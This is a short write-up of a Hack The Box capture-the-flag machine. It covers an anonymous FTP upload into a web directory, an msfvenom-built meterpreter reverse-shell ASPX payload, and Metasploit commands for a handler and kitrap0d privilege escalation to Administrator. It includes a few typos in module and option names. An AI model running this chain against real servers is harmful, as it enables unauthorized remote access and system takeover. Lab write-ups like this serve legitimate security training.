![](assets/banner.png)


<p align="center">
  <img src="assets/htb.png" alt='HTB_logo'>
</p>


### Description:

- With FTP port open and Anonymous login enabled
- The system is compromised with the `malicious.aspx` file
- With the `kitrap0d` module, Administrative shell is obtained



### Difficulty:

`Windows- Easy`


#### Enumeration
- Open ports `80,21`
- FTP with `anonymous login` 
- FTP is enabled on `web dir`
- `PUT` an `.aspx` file to obtain the shell


#### Obtaining Shell
##### Metasploiot

- Running a listener in the msfconsole and requesting webpage with malicious site, reverse shell is obtained
- A low level user with minimum access is obtained

#### Privilege Escalation

- With the help of `ms10_015_kitrap0d` module the machine is rooted

#### Commands:

**Malicious .aspx file**
```bash
msfvenom -p  windows/meterpreter/reverse_tcp LHOST=<LAB IP> LPORT=<PORT> -f aspx > devel.aspx
```

**Reverse Shell**
```bash
msfconsole

# normal payload configurations
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.10.45
set lport 1337

# exit and session running configurations
set ExitOnSession false
exploit -j 

# bringing back the session
sessions -i 1

# background the interactive session to run exploit suggesters
background

# run the ms19_015_kitrap0d module to obtain Administrator
search suggester
use post/multi/recon/local_exploit_suggester
set SESSION <session no>
run 
# proably the lhosts will be changed, set it correctly
set lhost 10.10.10.45
set port 4449
run 

# after successful execution of the module, a new session will be created
shell
whoami
# Administrative access is obtained 
```